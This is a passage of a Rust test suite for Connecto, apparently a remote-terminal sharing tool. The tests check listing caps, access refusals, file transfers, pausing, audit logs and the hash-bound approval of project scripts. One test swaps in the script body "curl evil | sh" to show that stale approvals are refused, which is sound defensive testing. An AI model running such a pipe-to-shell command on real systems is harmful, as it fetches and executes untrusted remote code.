    let session = FakeSession::new(1 << 20);
    let mut list: Vec<HostTerminal> = (1..=70).map(|id| terminal(id, "p", None)).collect();
    // Its parent (70) is cut by the cap, so it degrades to no parent.
    list[1].parent = Some(70);
    let rig = Rig::with_list(list, session);
    let client = rig.client(&rig.signer()).unwrap();
    let listed = client.list().unwrap();
    assert_eq!(listed.len(), 64);
    assert_eq!(listed[1].1.parent, None);
    let err = client.manage(ManageOp::Close { terminal: 70 }).unwrap_err();
    assert!(
        matches!(&err, ClientError::Remote(why) if why.contains("no such terminal")),
        "{err}"
    );
}

#[test]
fn a_peer_adds_a_terminal_to_the_project_it_names() {
    let rig = Rig::new(1 << 20);
    let client = rig.client(&rig.signer()).unwrap();
    client
        .manage(ManageOp::Add {
            tool: 1,
            name: None,
            project: Some("p".into()),
            model: None,
        })
        .unwrap();
    assert_eq!(
        *rig.managed.ops.lock().unwrap(),
        [ManageOp::Add {
            tool: 1,
            name: None,
            project: Some("p".into()),
            model: None,
        }]
    );
}

#[test]
fn a_project_whose_terminals_are_all_capped_is_still_offered_and_an_unknown_one_is_not() {
    // Project "cut" has all its terminals past the 64 offered. It is still an
    // open project, so it is listed and may take a terminal.
    let mut list: Vec<HostTerminal> = (1..=64).map(|id| terminal(id, "p", None)).collect();
    list.extend((65..=70).map(|id| terminal(id, "cut", None)));
    let rig = Rig::with_list(list, FakeSession::new(1 << 20));
    let client = rig.client(&rig.signer()).unwrap();
    let refused = |project: &str| {
        let err = client
            .manage(ManageOp::Add {
                tool: 1,
                name: None,
                project: Some(project.into()),
                model: None,
            })
            .unwrap_err();
        match err {
            ClientError::Remote(why) => why,
            other => panic!("{other}"),
        }
    };
    assert_eq!(refused("guessed-id"), NO_SUCH_PROJECT);
    client
        .manage(ManageOp::Add {
            tool: 1,
            name: None,
            project: Some("cut".into()),
            model: None,
        })
        .unwrap();
    assert_eq!(rig.managed.ops.lock().unwrap().len(), 1);
}

#[test]
fn a_peer_on_another_protocol_version_is_refused_with_its_reason() {
    let rig = Rig::new(1 << 20);
    let (conn, _host) = rig.connect(1);
    let control = conn.open_stream().unwrap();
    control.send(&Message::Hello { version: 1 }).unwrap();
    assert_eq!(
        control.recv(Duration::from_secs(5)).unwrap(),
        Some(Message::Denied(DenyReason::Version))
    );
    let err = ClientError::Denied(DenyReason::Version).to_string();
    assert!(err.contains("same Connecto version"), "{err}");
}

fn project(id: &str) -> ProjectInfo {
    ProjectInfo {
        id: id.to_owned(),
        name: format!("Name of {id}"),
    }
}

#[test]
fn a_project_opened_after_the_last_list_is_refused_until_the_peer_lists_again() {
    let rig = Rig::with_list(vec![terminal(1, "p", None)], FakeSession::new(1 << 20));
    let client = rig.client(&rig.signer()).unwrap();
    // Q opens on the host after the peer's list. Nothing was sent about Q.
    rig.managed
        .inner
        .0
        .lock()
        .unwrap()
        .push(terminal(2, "q", None));
    let add_q = ManageOp::Add {
        tool: 1,
        name: None,
        project: Some("q".into()),
        model: None,
    };
    let err = client.manage(add_q.clone()).unwrap_err();
    assert!(
        matches!(&err, ClientError::Remote(why) if why == NO_SUCH_PROJECT),
        "{err}"
    );
    assert!(rig.managed.ops.lock().unwrap().is_empty());
    // Once the peer has Q in a list, it may add to it.
    client.list().unwrap();
    client.manage(add_q).unwrap();
    assert_eq!(rig.managed.ops.lock().unwrap().len(), 1);
}

#[test]
fn a_reordered_host_still_takes_a_project_it_sent() {
    let rig = Rig::with_list(
        vec![terminal(1, "p", None), terminal(2, "q", None)],
        FakeSession::new(1 << 20),
    );
    let client = rig.client(&rig.signer()).unwrap();
    rig.managed.inner.0.lock().unwrap().reverse();
    client
        .manage(ManageOp::Add {
            tool: 1,
            name: None,
            project: Some("p".into()),
            model: None,
        })
        .unwrap();
    assert_eq!(rig.managed.ops.lock().unwrap().len(), 1);
}

#[test]
fn a_terminal_the_peer_was_not_sent_cannot_be_managed_or_attached() {
    let rig = Rig::with_list(vec![terminal(1, "p", None)], FakeSession::new(1 << 20));
    let client = rig.client(&rig.signer()).unwrap();
    rig.managed
        .inner
        .0
        .lock()
        .unwrap()
        .push(terminal(2, "p", None));
    let err = client.manage(ManageOp::Close { terminal: 2 }).unwrap_err();
    assert!(
        matches!(&err, ClientError::Remote(why) if why.contains("no such terminal")),
        "{err}"
    );
    assert!(rig.managed.ops.lock().unwrap().is_empty());
    let remote = RemoteSession::new(
        TerminalAddr {
            host: "build-box".into(),
            terminal: 2,
        },
        GridSize { cols: 60, rows: 12 },
        Arc::new(|| {}),
    );
    let attached = remote.attach(&client, 2);
    assert!(attached.is_err(), "an unlisted terminal attached");
}

#[test]
fn an_empty_project_is_listed_and_takes_its_first_terminal() {
    let rig = Rig::with_list(vec![terminal(1, "p", None)], FakeSession::new(1 << 20));
    rig.managed.empty.lock().unwrap().push(project("e"));
    let client = rig.client(&rig.signer()).unwrap();
    let listing = client.listing().unwrap();
    assert_eq!(
        listing
            .projects
            .iter()
            .map(|p| p.id.as_str())
            .collect::<Vec<_>>(),
        ["p", "e"]
    );
    assert!(listing.terminals.iter().all(|t| t.project_id == "p"));
    client
        .manage(ManageOp::Add {
            tool: 1,
            name: Some("first".into()),
            project: Some("e".into()),
            model: None,
        })
        .unwrap();
    assert_eq!(
        rig.managed.ops.lock().unwrap().last(),
        Some(&ManageOp::Add {
            tool: 1,
            name: Some("first".into()),
            project: Some("e".into()),
            model: None,
        })
    );
}

#[test]
fn models_are_offered_for_a_listed_project_and_an_add_carries_its_model() {
    let rig = Rig::with_list(vec![terminal(1, "p", None)], FakeSession::new(1 << 20));
    let client = rig.client(&rig.signer()).unwrap();
    assert!(!client.models_supported());
    // The rig's client has been sent the list: "p" is in it.
    assert_eq!(
        client.models(1, "p").unwrap(),
        Some(connecto_net::wire::ToolModels::default())
    );
    assert!(client.models_supported());
    assert!(client.models(1, "elsewhere").is_err());
    client
        .manage(ManageOp::Add {
            tool: 1,
            name: Some("app-session".into()),
            project: Some("p".into()),
            model: Some("sonnet".into()),
        })
        .unwrap();
    assert!(matches!(
        rig.managed.ops.lock().unwrap().last(),
        Some(ManageOp::Add { model: Some(m), .. }) if m == "sonnet"
    ));
}

/// A peer that asks for background work gets it in each list and can stop a
/// task of a terminal it was sent; one that did not ask gets the plain list,
/// and its stop is refused.
/// A peer reads a file a listed terminal names, in many chunks, as it is on
/// the host; a missing file, a terminal it was not sent and a pause are
/// refused, and every read asks the guard.
#[test]
fn a_peer_reads_a_file_its_terminal_names_unless_refused() {
    let rig = Rig::with_list(vec![terminal(1, "p", None)], FakeSession::new(1 << 20));
    let client = rig.client(&rig.signer()).unwrap();
    let bytes: Vec<u8> = (0..300_000u32).map(|n| (n % 251) as u8).collect();
    let file = rig.managed.attachment_root.path().join("shot.png");
    std::fs::write(&file, &bytes).unwrap();

    let (path, got) = client.read_file(1, "shot.png").unwrap();
    assert_eq!(got, bytes);
    assert_eq!(path, file.display().to_string());
    std::fs::write(&file, b"").unwrap();
    assert_eq!(client.read_file(1, "shot.png").unwrap().1, b"");

    let err = client.read_file(1, "missing.md").unwrap_err();
    assert!(
        matches!(&err, ClientError::Remote(why) if why.contains("no such file")),
        "{err}"
    );
    let err = client.read_file(99, "shot.png").unwrap_err();
    assert!(
        matches!(err, ClientError::Denied(DenyReason::NoSuchTerminal)),
        "{err}"
    );
    rig.pause.pause();
    let err = client.read_file(1, "shot.png").unwrap_err();
    assert!(
        matches!(err, ClientError::Denied(DenyReason::Paused)),
        "{err}"
    );
    rig.pause.resume();
    let log = rig.audit();
    assert!(log.contains("read-file"), "{log}");
}

/// A peer reads a listed project's history and a long transcript, and asks
/// for a change; a project it was not sent, a refusal and a pause are
/// refused, and every ask passes the guard.
#[test]
fn a_peer_asks_a_listed_projects_history_and_settings_unless_refused() {
    use connecto_net::project_panels::{self as panels, ProjectAsk};
    let rig = Rig::with_list(vec![terminal(1, "p", None)], FakeSession::new(1 << 20));
    let client = rig.client(&rig.signer()).unwrap();

    let history =
        panels::history_from(&client.project_ask("p", &ProjectAsk::History).unwrap()).unwrap();
    assert_eq!(history.len(), 1);
    assert_eq!(history[0].name.as_deref(), Some("old build"));
    let (id, text) = panels::transcript_from(
        &client
            .project_ask(
                "p",
                &ProjectAsk::Transcript {
                    history: "h1".into(),
                },
            )
            .unwrap(),
    )
    .unwrap();
    assert_eq!(id, "h1");
    assert_eq!(text.len(), 5 * 60_000, "every chunk arrived");
    let err = client
        .project_ask(
            "p",
            &ProjectAsk::Transcript {
                history: "gone".into(),
            },
        )
        .unwrap_err();
    assert!(
        matches!(&err, ClientError::Remote(why) if why.contains("no such")),
        "{err}"
    );
    client.project_ask("p", &ProjectAsk::TokensUndo).unwrap();

    let err = client
        .project_ask("elsewhere", &ProjectAsk::History)
        .unwrap_err();
    assert!(
        matches!(err, ClientError::Denied(DenyReason::NoSuchTerminal)),
        "{err}"
    );
    rig.pause.pause();
    let err = client.project_ask("p", &ProjectAsk::Settings).unwrap_err();
    assert!(
        matches!(err, ClientError::Denied(DenyReason::Paused)),
        "{err}"
    );
    rig.pause.resume();
    let asks = rig.managed.asks.lock().unwrap().clone();
    assert!(asks.iter().all(|(project, _)| project == "p"));
    assert_eq!(asks.len(), 4, "the refused ones never reached the project");
    let log = rig.audit();
    for action in [
        "project-history",
        "project-transcript",
        "project-tokens-undo",
    ] {
        assert!(log.contains(action), "{action}: {log}");
    }
}

const OP_SPEC: &str = r#"{"version":1,"name":"Tests","description":"Runs the tests.","phrases":["run the tests"],"kind":"script","danger":"none","args":[{"name":"filter"}]}"#;

/// A host project's operations as a peer reads them: page by page.
fn ops_view(client: &RemoteClient, shown_as: &str) -> connecto_core::ops::OpsView {
    connecto_net::project_panels::fetch_ops_view(
        |ask| client.project_ask("p", ask).map_err(|e| e.to_string()),
        shown_as,
    )
    .unwrap()
}

/// A project whose operations do not fit one answer (once escaped: every
/// quote and backslash is sent as two bytes) is read in pages, and its last
/// operation arrives whole: approved and run from the peer, with an argument
/// longer than 4 KiB, as the host's own dialog could.
#[test]
fn a_peer_approves_and_runs_the_last_operation_of_a_project_past_one_answer() {
    use connecto_core::ops::{OpStanding, OpsAction};
    use connecto_net::project_panels::{MAX_ANSWER, ProjectAsk};
    let rig = Rig::with_list(vec![terminal(1, "p", None)], FakeSession::new(1 << 20));
    let ops = Arc::clone(&rig.managed.project_ops);
    let body = format!("echo \"{}\" \"$1\"\n", "\\\"".repeat(15_000));
    for i in 0..80 {
        ops.write(&format!("op-{i:02}"), OP_SPEC, &body);
    }
    let client = rig.client(&rig.signer()).unwrap();
    let first = client
        .project_ask("p", &ProjectAsk::Ops { after: None })
        .unwrap();
    assert!(first.len() as u64 <= MAX_ANSWER);
    let view = ops_view(&client, "p");
    assert_eq!(view.ops.len(), 80, "every page arrived");
    let last = view.ops.last().unwrap().clone();
    assert_eq!(last.slug, "op-79");
    assert_eq!(last.standing, OpStanding::Proposed, "not cut, not invalid");
    assert_eq!(last.body, body);
    assert_eq!(last.hash, ops.on_disk("op-79"));

    client
        .project_ask(
            "p",
            &ProjectAsk::OpsAct(OpsAction::Approve {
                slug: last.slug.clone(),
                hash: last.hash.clone(),
            }),
        )
        .unwrap();
    let long = "a".repeat(5000);
    client
        .project_ask(
            "p",
            &ProjectAsk::OpsAct(OpsAction::Run {
                slug: last.slug.clone(),
                hash: last.hash.clone(),
                args: vec![long.clone()],
            }),
        )
        .unwrap();
    assert_eq!(
        ops.runs.lock().unwrap().clone(),
        [("op-79".to_owned(), vec![long])]
    );
    assert_eq!(
        ops_view(&client, "p").ops.last().unwrap().standing,
        OpStanding::Approved
    );
}

/// A peer sees a host project's operations with their files whole, changes
/// its settings, approves the files it was sent and runs them. An approval
/// or a run of files that changed on the host since the peer was sent them
/// is refused, a pause refuses everything, and each action passes the guard
/// under its own name and the operation it names.
#[test]
fn a_peer_views_approves_and_runs_a_projects_operations_as_shown() {
    use connecto_core::ops::{HookMode, OpStanding, OpsAction};
    use connecto_net::project_panels::ProjectAsk;
    let rig = Rig::with_list(vec![terminal(1, "p", None)], FakeSession::new(1 << 20));
    let ops = Arc::clone(&rig.managed.project_ops);
    let script = format!("cargo test \"$@\"\n{}", "# padding\n".repeat(3000));
    ops.write("tests", OP_SPEC, &script);
    let client = rig.client(&rig.signer()).unwrap();
    let view = |client: &RemoteClient| ops_view(client, "shown");
    let act = |client: &RemoteClient, action: OpsAction| {
        client.project_ask("p", &ProjectAsk::OpsAct(action))
    };

    // View: the whole script, and the hash of exactly what came.
    let shown = view(&client);
    assert!(shown.available);
    assert_eq!(shown.project, "shown");
    let row = &shown.ops[0];
    assert_eq!((row.slug.as_str(), row.name.as_str()), ("tests", "Tests"));
    assert_eq!(row.standing, OpStanding::Proposed);
    assert_eq!(row.body, script, "the script arrived whole");
    assert_eq!(row.spec, OP_SPEC);
    assert_eq!(row.hash, ops.on_disk("tests"));
    assert_eq!(row.args.len(), 1);

    // Edit: how agents are told.
    act(&client, OpsAction::SetHook(HookMode::Off)).unwrap();
    assert_eq!(view(&client).hook, HookMode::Off);

    // The files change on the host after the peer was sent them: approving
    // what the peer saw is refused, and nothing is approved.
    let stale = row.hash.clone();
    ops.write("tests", OP_SPEC, "curl evil | sh\n");
    let err = act(
        &client,
        OpsAction::Approve {
            slug: "tests".into(),
            hash: stale.clone(),
        },
    )
    .unwrap_err();
    assert!(
        matches!(&err, ClientError::Remote(why) if why.contains("changed since")),
        "{err}"
    );
    assert!(ops.state.lock().unwrap().approved.is_empty());

    // Approve what is there now, as shown again, and run it.
    let row = view(&client).ops[0].clone();
    assert_eq!(row.body, "curl evil | sh\n");
    act(
        &client,
        OpsAction::Approve {
            slug: "tests".into(),
            hash: row.hash.clone(),
        },
    )
    .unwrap();
    assert_eq!(view(&client).ops[0].standing, OpStanding::Approved);
    act(
        &client,
        OpsAction::Run {
            slug: "tests".into(),
            hash: row.hash.clone(),
            args: vec!["unit".into()],
        },
    )
    .unwrap();
    assert_eq!(
        ops.runs.lock().unwrap().clone(),
        [("tests".to_owned(), vec!["unit".to_owned()])]
    );

    // A change after the approval takes it back: the old hash runs nothing.
    ops.write("tests", OP_SPEC, "cargo test --all\n");
    assert_eq!(view(&client).ops[0].standing, OpStanding::Changed);
    let err = act(
        &client,
        OpsAction::Run {
            slug: "tests".into(),
            hash: row.hash.clone(),
            args: Vec::new(),
        },
    )
    .unwrap_err();
    assert!(matches!(&err, ClientError::Remote(_)), "{err}");

    // Paused: no view, no action reaches the project.
    let fresh = view(&client).ops[0].hash.clone();
    rig.pause.pause();
    for ask in [
        ProjectAsk::Ops { after: None },
        ProjectAsk::OpsAct(OpsAction::Approve {
            slug: "tests".into(),
            hash: fresh,
        }),
    ] {
        let err = client.project_ask("p", &ask).unwrap_err();
        assert!(
            matches!(err, ClientError::Denied(DenyReason::Paused)),
            "{err}"
        );
    }
    rig.pause.resume();
    assert_eq!(
        ops.runs.lock().unwrap().len(),
        1,
        "nothing ran while paused"
    );
    assert_eq!(
        ops.state.lock().unwrap().approved.get("tests"),
        Some(&row.hash),
        "nothing was approved while paused"
    );

    let log = rig.audit();
    for action in [
        "project-ops",
        "project-ops-hook",
        "project-ops-approve",
        "project-ops-run",
    ] {
        assert!(log.contains(action), "{action}: {log}");
    }
    assert!(log.contains("p/tests"), "the operation is recorded: {log}");
}

/// A file the host offers (`connecto send-file`) is listed to a peer that
/// was sent its project, and downloads whole; an offer in a project the peer
/// was not sent is neither listed nor sent, and a pause refuses the download.
#[test]
fn a_peer_lists_and_downloads_what_the_host_offers_in_its_projects() {
    use connecto_net::wire::OfferInfo;
    let rig = Rig::with_list(vec![terminal(1, "p", None)], FakeSession::new(1 << 20));
    let bytes: Vec<u8> = (0..200_000u32).map(|n| (n % 253) as u8).collect();
    let file = rig.managed.attachment_root.path().join("report.html");
    std::fs::write(&file, &bytes).unwrap();
    let offer = |id: u64, project: &str| OfferInfo {
        id,
        project: project.into(),
        terminal: "claude-1".into(),
        name: "report.html".into(),
        bytes: 200_000,
        age_secs: 1,
    };
    *rig.managed.offered.lock().unwrap() = vec![
        (offer(1, "p"), file.clone()),
        (offer(2, "hidden"), file.clone()),
    ];
    let client = rig.client(&rig.signer()).unwrap();
    assert_eq!(client.offers().unwrap(), Some(vec![offer(1, "p")]));
    let (name, got) = client.read_offer(1).unwrap();
    assert_eq!(name, "report.html");
    assert_eq!(got, bytes);
    let err = client.read_offer(2).unwrap_err();
    assert!(
        matches!(&err, ClientError::Remote(why) if why.contains("no longer offered")),
        "{err}"
    );
    rig.pause.pause();
    let err = client.read_offer(1).unwrap_err();
    assert!(
        matches!(err, ClientError::Denied(DenyReason::Paused)),
        "{err}"
    );
    rig.pause.resume();
    assert!(rig.audit().contains("read-offer"));
    // The project closes on the host: its offers are no longer named, before
    // any new list.
    rig.managed.inner.0.lock().unwrap().clear();
    assert_eq!(client.offers().unwrap(), Some(Vec::new()));
    let err = client.read_offer(1).unwrap_err();
    assert!(
        matches!(&err, ClientError::Remote(why) if why.contains("no longer offered")),
        "{err}"
    );
}

/// A file dropped or pasted on any of the host's terminals (a shell too, not
/// only a project chat) is saved in that terminal's project's attachments
/// folder, and the host's path comes back to be typed. A terminal the peer
/// was not sent, a bad name, an oversized file and a pause are refused and
/// save nothing; every upload asks the guard.
#[test]
fn a_file_sent_to_a_terminal_is_saved_in_its_projects_attachments_unless_refused() {
    let mut shell = terminal(1, "p", None);
    shell.tool = 0;
    let rig = Rig::with_list(
        vec![shell, terminal(2, "q", None)],
        FakeSession::new(1 << 20),
    );
    let client = rig.client(&rig.signer()).unwrap();
    let uploads = rig.managed.attachment_root.path().join("chat-attachments");
    let bytes: Vec<u8> = (0..150_000u32).map(|n| (n % 251) as u8).collect();

    let path = client.upload_file(1, "shot one.png", &bytes).unwrap();
    let path = std::path::Path::new(&path);
    assert!(path.starts_with(uploads.join("p")), "{}", path.display());
    assert!(
        path.to_str().unwrap().ends_with("-shot_one.png"),
        "{}",
        path.display()
    );
    assert_eq!(std::fs::read(path).unwrap(), bytes);
    // The same name twice is two files; terminal 2's goes to its project.
    let again = client.upload_file(1, "shot one.png", b"x").unwrap();
    assert_ne!(std::path::Path::new(&again), path);
    let other = client.upload_file(2, "notes.txt", b"q").unwrap();
    assert!(std::path::Path::new(&other).starts_with(uploads.join("q")));
    let count = || std::fs::read_dir(uploads.join("p")).unwrap().count();
    assert_eq!(count(), 2);

    for name in ["../x.png", "a\\b", "", "line\nbreak"] {
        let err = client.upload_file(1, name, b"x").unwrap_err();
        assert!(matches!(err, ClientError::Remote(_)), "{name:?}: {err}");
    }
    let err = client.upload_file(99, "x.png", b"x").unwrap_err();
    assert!(matches!(err, ClientError::Remote(_)), "{err}");
    // This client asked for no features, as to an older host: 10 MiB.
    let big = vec![0; connecto_net::wire::LEGACY_UPLOAD_BYTES + 1];
    let err = client.upload_file(1, "big.bin", &big).unwrap_err();
    assert!(err.to_string().contains("10 MiB"), "{err}");
    rig.pause.pause();
    let err = client.upload_file(1, "x.png", b"x").unwrap_err();
    assert!(err.to_string().contains("paused"), "{err}");
    rig.pause.resume();
    assert_eq!(count(), 2);
    // The connection goes on as before.
    assert_eq!(client.list().unwrap().len(), 2);
    let log = rig.audit();
    assert_eq!(log.matches("\"upload-file\"").count(), 4, "{log}");
    assert_eq!(log.matches("\"decision\":\"deny\"").count(), 1, "{log}");
}

/// A host that grants `FEATURE_LARGE_UPLOADS` takes a file of up to 100 MiB
/// on its terminals, and refuses a byte more before any is sent. A client
/// its host did not grant it to (a host from before it, which takes 10 MiB)
/// says so at once and sends nothing, and still sends 10 MiB, as an older
/// client does to a newer host. The host holds a connection that did not
/// ask for it to 10 MiB itself.
#[test]
fn a_terminal_upload_past_ten_mib_goes_only_to_a_host_that_takes_it() {
    use connecto_net::wire::{FEATURE_LARGE_UPLOADS, LEGACY_UPLOAD_BYTES, MAX_UPLOAD_BYTES};
    let rig = Rig::with_list(vec![terminal(1, "p", None)], FakeSession::new(1 << 20));
    let uploads = rig
        .managed
        .attachment_root
        .path()
        .join("chat-attachments")
        .join("p");
    let count = || std::fs::read_dir(&uploads).map_or(0, Iterator::count);
    let large: Vec<u8> = (0..=LEGACY_UPLOAD_BYTES).map(|n| (n % 251) as u8).collect();

    // A host that did not grant it: refused here, at once, in plain words.
    let older = rig.client(&rig.signer()).unwrap();
    assert!(!older.has_feature(FEATURE_LARGE_UPLOADS));
    let started = Instant::now();
    let err = older.upload_file(1, "big.bin", &large).unwrap_err();
    assert!(matches!(err, ClientError::Remote(_)), "{err}");
    let said = err.to_string();
    assert!(
        said.contains("up to 10 MiB")
            && said.contains("Update Connecto on the host")
            && said.contains("100 MiB"),
        "{said}"
    );
    assert!(started.elapsed() < Duration::from_secs(2));
    assert_eq!(count(), 0);
    assert!(
        !rig.audit().contains("\"upload-file\""),
        "nothing was asked"
    );
    // 10 MiB still goes, as it always did.
    let ten = older
        .upload_file(1, "ten.bin", &large[..LEGACY_UPLOAD_BYTES])
        .unwrap();
    assert_eq!(std::fs::read(&ten).unwrap(), large[..LEGACY_UPLOAD_BYTES]);

    // A host that grants it takes more, whole, and leaves no temporary.
    let client = rig.client(&rig.signer()).unwrap();
    assert_eq!(
        client.request_features(FEATURE_LARGE_UPLOADS).unwrap(),
        FEATURE_LARGE_UPLOADS
    );
    let path = client.upload_file(1, "big.bin", &large).unwrap();
    assert_eq!(std::fs::read(&path).unwrap(), large);
    assert_eq!(count(), 2);
    let over = vec![0; MAX_UPLOAD_BYTES + 1];
    let err = client.upload_file(1, "over.bin", &over).unwrap_err();
    assert!(err.to_string().contains("larger than the 100 MiB"), "{err}");

    // The host's own check, at the edge, without sending 100 MiB. On a
    // connection that did not ask for large uploads it holds to 10 MiB;
    // on one that did, the largest is taken (the host is ready for it) and
    // a byte more is not.
    let ask = |conn: &dyn Connection, bytes: usize| {
        let stream = conn.open_stream().unwrap();
        stream
            .send(&Message::TerminalUpload {
                terminal: 1,
                name: "edge.bin".into(),
                bytes: u32::try_from(bytes).unwrap(),
            })
            .unwrap();
        stream.recv(Duration::from_secs(5)).unwrap()
    };
    let refused = |reply: Option<Message>, said: &str| match reply {
        Some(Message::AttachmentResult(Err(why))) => assert!(why.contains(said), "{why}"),
        other => panic!("{other:?}"),
    };
    let (_older, plain) = rig.connect_as(true);
    refused(
        ask(&*plain, LEGACY_UPLOAD_BYTES + 1),
        "larger than the 10 MiB",
    );
    let (peer, conn) = rig.connect_as(true);
    assert_eq!(
        peer.request_features(FEATURE_LARGE_UPLOADS).unwrap(),
        FEATURE_LARGE_UPLOADS
    );
    refused(ask(&*conn, MAX_UPLOAD_BYTES + 1), "larger than the 100 MiB");
    assert!(matches!(
        ask(&*conn, MAX_UPLOAD_BYTES),
        Some(Message::AttachmentReady)
    ));
    // Abandoned: its temporary goes, and only the two files stay.
    let deadline = Instant::now() + Duration::from_secs(10);
    while count() != 2 && Instant::now() < deadline {
        thread::sleep(Duration::from_millis(20));
    }
    assert_eq!(count(), 2);
}

#[test]
fn background_work_is_listed_and_stopped_only_for_a_peer_that_asked() {
    let rig = || {
        let mut busy = terminal(1, "p", None);
        busy.background = vec![connecto_net::wire::BackgroundInfo {
            id: "b1".into(),
            kind: "shell".into(),
            label: "npm run dev".into(),
            description: Some("Start the dev server".into()),
            seconds: 60,
        }];
        Rig::with_list(vec![busy], FakeSession::new(1 << 20))
    };

    let old_peer = rig();
    let plain = old_peer.client(&old_peer.signer()).unwrap();
    assert!(!plain.has_feature(connecto_net::wire::FEATURE_BACKGROUND));
    assert!(plain.listing().unwrap().terminals[0].background.is_empty());
    let stop = ManageOp::StopBackground {
        terminal: 1,
        task: Some("b1".into()),
    };
    assert!(plain.manage(stop.clone()).is_err());
    assert!(old_peer.managed.ops.lock().unwrap().is_empty());

    let rig = rig();
    let client = rig.client(&rig.signer()).unwrap();
    assert_eq!(
        client
            .request_features(connecto_net::wire::FEATURE_BACKGROUND | 0x80)
            .unwrap(),
        connecto_net::wire::FEATURE_BACKGROUND
    );
    let listing = client.listing().unwrap();
    let work = &listing.terminals[0].background;
    assert_eq!(work.len(), 1);
    assert_eq!(work[0].description.as_deref(), Some("Start the dev server"));
    client.manage(stop.clone()).unwrap();
    assert_eq!(rig.managed.ops.lock().unwrap().last(), Some(&stop));
    // A terminal the list did not send cannot be named.
    assert!(
        client
            .manage(ManageOp::StopBackground {
                terminal: 99,
                task: None,
            })
            .is_err()
    );
}

/// A terminal's id on the host reaches a peer that asked for it, so its
/// sidebar shows `claude-12` as the host does; a peer that asked only for
/// background work gets the list it always did.
#[test]
fn the_host_terminal_id_is_listed_only_for_a_peer_that_asked() {
    use connecto_net::wire::{FEATURE_BACKGROUND, FEATURE_TERMINAL_IDS};
    let rig = || {
        let mut chat = terminal(1, "p", None);
        chat.entry = Some("claude-12".into());
        Rig::with_list(vec![chat], FakeSession::new(1 << 20))
    };

    let old_peer = rig();
    let older = old_peer.client(&old_peer.signer()).unwrap();
    assert_eq!(
        older.request_features(FEATURE_BACKGROUND).unwrap(),
        FEATURE_BACKGROUND
    );
    assert_eq!(older.listing().unwrap().terminals[0].entry, None);

    // Ids alone are not granted: they come in the extended list.
    let lone = rig();
    let ids_only = lone.client(&lone.signer()).unwrap();
    assert_eq!(ids_only.request_features(FEATURE_TERMINAL_IDS).unwrap(), 0);

    let rig = rig();
    let client = rig.client(&rig.signer()).unwrap();
    let both = FEATURE_BACKGROUND | FEATURE_TERMINAL_IDS;
    assert_eq!(client.request_features(both).unwrap(), both);
    let listing = client.listing().unwrap();
    assert_eq!(listing.terminals[0].entry.as_deref(), Some("claude-12"));
    assert_eq!(listing.terminals[0].id, 1);
}

/// Terminals the host has not started since it launched go only to a peer
/// that asked for the host's ids. Left out before the cap for any other, so
/// an older peer behind 64 of them still sees, and can attach to, the
/// running terminal it always saw.
#[test]
fn never_started_terminals_do_not_crowd_out_an_older_peers_list() {
    use connecto_net::wire::{FEATURE_BACKGROUND, FEATURE_TERMINAL_IDS};
    let rig = || {
        let mut list = Vec::new();
        for id in 100..164 {
            let session = FakeSession::new(1024);
            session.never_run.store(true, Ordering::SeqCst);
            let mut dormant = terminal_on(&session, id, "p");
            dormant.ran = false;
            list.push(dormant);
        }
        // A restored chat waiting for Start was always listed.
        let chat = FakeSession::new(1024);
        chat.never_run.store(true, Ordering::SeqCst);
        let mut chat = terminal_on(&chat, 200, "p");
        chat.name = connecto_core::session::APP_SESSION.into();
        list.push(chat);
        let running = FakeSession::new(1 << 20);
        list.push(terminal_on(&running, 7, "p"));
        Rig::with_list(list, running)
    };

    let old_rig = rig();
    let older = old_rig.client(&old_rig.signer()).unwrap();
    assert_eq!(
        older.request_features(FEATURE_BACKGROUND).unwrap(),
        FEATURE_BACKGROUND
    );
    let ids: Vec<u32> = older
        .listing()
        .unwrap()
        .terminals
        .iter()
        .map(|t| t.id)
        .collect();
    assert_eq!(ids, vec![200, 7], "an older peer lists as before");
    attach(&older);

    let new_rig = rig();
    let newer = new_rig.client(&new_rig.signer()).unwrap();
    let both = FEATURE_BACKGROUND | FEATURE_TERMINAL_IDS;
    assert_eq!(newer.request_features(both).unwrap(), both);
    let listing = newer.listing().unwrap();
    assert_eq!(
        listing.terminals.len(),
        64,
        "the host's sidebar, to the cap"
    );
    assert!(listing.terminals.iter().all(|t| t.id >= 100 && t.id < 164));
}

#[test]
fn the_listing_offers_sixty_four_projects_and_only_those_can_be_named() {
    let rig = Rig::with_list(vec![terminal(1, "p", None)], FakeSession::new(1 << 20));
    rig.managed
        .empty
        .lock()
        .unwrap()
        .extend((0..70).map(|n| project(&format!("e{n:02}"))));
    let client = rig.client(&rig.signer()).unwrap();
    let listing = client.listing().unwrap();
    assert_eq!(listing.projects.len(), 64);
    assert_eq!(listing.projects[0].id, "p");
    let refused = |project: &str| {
        let err = client
            .manage(ManageOp::Add {
                tool: 1,
                name: None,
                project: Some(project.into()),
                model: None,
            })
            .unwrap_err();
        match err {
            ClientError::Remote(why) => why,
            other => panic!("{other}"),
        }
    };
    // "p" and e00..e62 are the 64; e63 on is past the cap.
    assert_eq!(listing.projects.last().map(|p| p.id.as_str()), Some("e62"));
    assert_eq!(refused("e69"), NO_SUCH_PROJECT);
    assert_eq!(refused("e63"), NO_SUCH_PROJECT);
    assert!(rig.managed.ops.lock().unwrap().is_empty());
    client
        .manage(ManageOp::Add {
            tool: 1,
            name: None,
            project: Some("e62".into()),
            model: None,
        })
        .unwrap();
}

#[test]
fn an_add_without_a_project_resolves_the_active_one_and_refuses_it_when_it_is_not_offered() {
    // The host's active project is "p", which has no terminal in this list.
    let rig = Rig::with_list(vec![terminal(1, "q", None)], FakeSession::new(1 << 20));
    let client = rig.client(&rig.signer()).unwrap();
    let err = client
        .manage(ManageOp::Add {
            tool: 1,
            name: None,
            project: None,
            model: None,
        })
        .unwrap_err();
    assert!(
        matches!(&err, ClientError::Remote(why) if why == NO_SUCH_PROJECT),
        "{err}"
    );
    assert!(rig.managed.ops.lock().unwrap().is_empty(), "the host acted");
}

/// A request a connection can make, for the table test of the rule on `Shown`.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Op {
    Attach,
    Input,
    Resize,
    Rename,
    Restart,
    Close,
    Add,
}

const ALL_OPS: [Op; 7] = [
    Op::Attach,
    Op::Input,
    Op::Resize,
    Op::Rename,
    Op::Restart,
    Op::Close,
    Op::Add,
];

/// How the connection came to know the terminal, or not.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Case {
    /// Between the host's check and the registry's action, the entry is closed
    /// and a new entry is created: a different identity, under a different id.
    EntryClosedAndNewCreatedBetween,
    /// The connection never takes a list.
    NeverListed,
    /// Listed, then a later list no longer has it.
    ListedThenRemoved,
    /// Listed, then closed, and a new entry took its number in another project.
    ListedThenReused,
